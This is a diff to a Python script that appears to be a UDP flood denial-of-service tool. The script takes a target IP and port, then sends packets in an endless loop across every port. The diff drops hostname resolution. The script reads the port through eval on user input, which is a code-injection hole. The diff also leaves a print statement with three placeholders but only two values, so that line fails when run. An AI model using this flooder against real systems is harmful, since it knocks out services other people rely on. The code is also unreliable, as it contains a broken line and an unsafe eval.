@@ -36,14 +36,8 @@ Twitter : @Marsh_Security
 
 """
 print(banner)
-while True:
-      ips = input("URL or IP of Target : ").lower()
-      try:
-             ip = s.gethostbyname(ips)
-             break
-      except:
-             print(Fore.RED + "ERROR :  Please enter valid IP or URL or try with no https:// or http://")
 
+ips = input("IP of Target : ")
 print(Fore.YELLOW + f"TARGET SET ==>> {ips}" + Fore.YELLOW)
 port = eval(input("Port  : "))
 try:
@@ -64,10 +58,10 @@ print("[====================] 100%")
 time.sleep(2)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,port))
+     sock.sendto(bytes, (ips,port))
      sent = sent + 1
      port = port + 1
-     print(Fore.YELLOW + "%s packet send ====>>>>>> %s      [[  %s  ]]"%(sent,ips, ip))
+     print(Fore.YELLOW + "%s packet send ====>>>>>> %s      [[  %s  ]]"%(sent,ips))
      if port == 65534:
        port = 1
 
